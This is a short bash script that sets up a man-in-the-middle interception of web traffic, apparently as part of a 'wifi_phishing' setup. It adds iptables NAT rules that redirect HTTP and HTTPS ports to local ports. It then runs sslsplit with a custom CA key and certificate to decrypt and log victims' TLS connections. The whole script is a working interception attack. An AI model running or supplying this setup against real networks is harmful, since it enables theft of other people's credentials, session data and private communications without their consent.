#! /bin/bash

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443

cd sslsplit
rm logdir/*
sslsplit -D -l connect.log -j ~/Desktop/wifi_phishing/sslsplit -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

